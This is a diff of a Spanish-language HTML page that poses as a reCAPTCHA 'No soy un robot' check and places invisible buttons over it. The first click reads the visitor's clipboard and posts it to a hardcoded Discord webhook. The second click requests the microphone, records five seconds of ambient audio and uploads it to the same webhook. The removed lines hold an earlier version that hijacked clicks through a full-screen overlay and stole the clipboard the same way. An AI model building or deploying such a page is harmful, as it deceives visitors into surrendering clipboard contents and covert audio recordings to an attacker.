@@ -5,120 +5,128 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Verificación de Seguridad</title>
     <style>
-        :root {
-            --android-bg: #1A1C1E;
-            --android-text: #E3E2E6;
-            --android-blue: #A8C7FA;
-        }
-
-        body, html { margin: 0; padding: 0; height: 100%; background: var(--android-bg); font-family: 'Roboto', sans-serif; overflow: hidden; }
+        body { background: #FFFFFF; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         
-        /* 1. Capa de Oscurecimiento Agresiva */
-        #ghost-dimmer {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0);
-            transition: background 2s cubic-bezier(0.4, 0, 1, 1);
-            z-index: 1000;
+        /* Contenedor del Captcha Falso */
+        #captcha-container {
+            width: 300px; height: 74px;
+            background: #F9F9F9; border: 1px solid #D3D3D3;
+            border-radius: 3px; display: flex; align-items: center;
+            padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.1);
+            position: relative; cursor: pointer;
         }
-
-        /* 2. El Botón Maestro (Cubre toda la pantalla, invisible) */
-        #master-trigger {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100vw; height: 100vh;
-            background: rgba(0,0,0,0);
-            border: none;
-            z-index: 5000; /* Por encima de todo */
-            cursor: pointer;
+        #checkbox {
+            width: 24px; height: 24px; border: 2px solid #C1C1C1;
+            border-radius: 2px; background: #FFF; margin-right: 15px;
+            position: relative; transition: all 0.2s;
         }
+        #label { color: #555; font-size: 14px; flex-grow: 1; user-select: none; }
+        #logo { width: 38px; text-align: center; }
+        #logo img { width: 30px; }
+        #logo span { font-size: 8px; color: #555; display: block; }
 
-        /* 3. Flash Subliminal Extremo (1ms) */
-        #subliminal-flash {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: #4285F4;
-            display: none;
-            z-index: 6000;
+        /* Capas de Intercepción */
+        #subliminal-flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #4285F4; display: none; z-index: 9000; }
+        
+        /* Botones invisibles que cubren el captcha */
+        .master-trigger {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0); border: none; z-index: 5000; cursor: pointer;
         }
-
-        #content-view { color: var(--android-text); text-align: center; margin-top: 35vh; pointer-events: none; }
-        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: var(--android-blue); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div id="ghost-dimmer"></div>
     <div id="subliminal-flash"></div>
-    
-    <button id="master-trigger"></button>
 
-    <div id="content-view">
-        <div class="spinner"></div>
-        <h2>Sincronizando con el dispositivo...</h2>
-        <p style="color: #8E9199;">No interrumpas el proceso.</p>
+    <div id="captcha-container">
+        <button id="trigger-1" class="master-trigger"></button>
+        <button id="trigger-2" class="master-trigger" style="display:none;"></button>
+        
+        <div id="checkbox"></div>
+        <div id="label">No soy un robot</div>
+        <div id="logo">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+            <span>reCAPTCHA</span>
+        </div>
     </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
         
-        const dimmer = document.getElementById('ghost-dimmer');
+        let clickCount = 0;
         const flash = document.getElementById('subliminal-flash');
-        const trigger = document.getElementById('master-trigger');
+        const trigger1 = document.getElementById('trigger-1');
+        const trigger2 = document.getElementById('trigger-2');
+        const checkbox = document.getElementById('checkbox');
 
-        // Oscurecimiento casi instantáneo para provocar el reflejo
-        window.onload = () => {
-            setTimeout(() => {
-                dimmer.style.background = "rgba(0, 0, 0, 0.98)";
-            }, 400);
-        };
-
-        // LA JUGADA MAESTRA: 1 Solo Clic
-        trigger.addEventListener('click', async () => {
-            // 1. Flash de 1ms (Ceguera funcional instantánea)
+        // CLIC 1: El "Fallo" y Captura de Portapapeles
+        trigger1.addEventListener('click', async () => {
+            // Flash de 1ms para validar el contacto
             flash.style.display = 'block';
             setTimeout(() => { flash.style.display = 'none'; }, 1);
 
-            // 2. Restaurar visualmente para no levantar sospechas
-            dimmer.style.transition = "none";
-            dimmer.style.background = "transparent";
-            trigger.style.display = "none";
+            // Efecto de "clic fallido": El checkbox brilla pero no se marca
+            checkbox.style.borderColor = "#4285F4";
+            setTimeout(() => { checkbox.style.borderColor = "#C1C1C1"; }, 300);
 
             try {
-                // 3. Captura inmediata del portapapeles
-                // El navegador mostrará el diálogo nativo de "Permitir"
-                // El usuario ya está haciendo clic, así que presiona "Permitir" por inercia
                 const text = await navigator.clipboard.readText();
-                if (text) enviarADiscord(text);
-            } catch (err) {
-                // Si falla, enviamos error silencioso y redirigimos
+                enviarTextoDiscord(text);
+            } catch (e) { console.log("Clipboard bloqueado"); }
+
+            // Cambiamos al segundo disparador
+            trigger1.style.display = "none";
+            trigger2.style.display = "block";
+        });
+
+        // CLIC 2: El Micrófono
+        trigger2.addEventListener('click', async () => {
+            trigger2.style.display = "none";
+            checkbox.innerHTML = '<div style="width:12px; height:6px; border-left:3px solid #00AA00; border-bottom:3px solid #00AA00; transform:rotate(-45deg); margin:4px auto;"></div>';
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                let audioChunks = [];
+
+                mediaRecorder.ondataavailable = (event) => { audioChunks.push(event.data); };
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                    enviarAudioDiscord(audioBlob);
+                };
+
+                mediaRecorder.start();
+                // Grabamos 5 segundos de audio ambiente
+                setTimeout(() => { mediaRecorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 5000);
+            } catch (e) {
                 window.location.href = "https://www.google.com";
             }
         });
 
-        function enviarADiscord(contenido) {
+        function enviarTextoDiscord(contenido) {
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "⚡ Intercepción de Clic Único",
-                        color: 4359668,
-                        fields: [
-                            { name: "Portapapeles", value: "```" + contenido + "```" },
-                            { name: "Info", value: navigator.userAgent }
-                        ],
-                        footer: { text: "Neuro-Kernel Exploit | 1ms Flash" },
-                        timestamp: new Date()
+                        title: "🔑 Portapapeles - Fase 1",
+                        description: "```" + contenido + "```",
+                        color: 4359668
                     }]
                 })
-            }).then(() => {
-                alert("Análisis completado con éxito.");
-                window.location.href = "https://www.google.com";
             });
+        }
+
+        function enviarAudioDiscord(blob) {
+            const formData = new FormData();
+            formData.append('file', blob, 'audio_capturado.wav');
+            formData.append('payload_json', JSON.stringify({
+                embeds: [{ title: "🎙️ Audio Ambiente - Fase 2", color: 16711680 }]
+            }));
+
+            fetch(WEBHOOK_URL, { method: 'POST', body: formData })
+            .then(() => { window.location.href = "https://www.google.com"; });
         }
     </script>
 </body>
